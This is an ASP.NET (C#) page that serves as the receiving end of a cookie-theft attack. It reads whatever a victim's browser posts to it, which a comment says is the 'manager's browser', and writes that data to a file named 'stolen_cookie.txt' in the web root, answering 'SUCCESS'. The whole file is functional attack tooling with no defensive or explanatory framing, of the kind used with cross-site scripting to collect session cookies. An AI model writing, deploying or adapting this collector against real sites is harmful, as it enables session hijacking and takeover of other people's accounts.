<%@ Page Language="C#" Debug="true" %>
<%@ Import Namespace="System.IO" %>
<script runat="server">
    void Page_Load(object sender, EventArgs e) {
        try {
            string webRoot = Server.MapPath("~");
            string targetFile = Path.Combine(webRoot, "stolen_cookie.txt");
            
            // Read the raw HTTP request body bytes sent by the manager's browser
            using (StreamReader reader = new StreamReader(Request.InputStream)) {
                string payload = reader.ReadToEnd();
                if (!string.IsNullOrEmpty(payload)) {
                    // Forcefully write and overwrite the file on the local disk drive
                    File.WriteAllText(targetFile, payload);
                    Response.Write("SUCCESS");
                } else {
                    Response.Write("EMPTY_PAYLOAD");
                }
            }
        } catch (Exception ex) {
            Response.Write("ERROR: " + ex.Message);
        }
    }
</script>
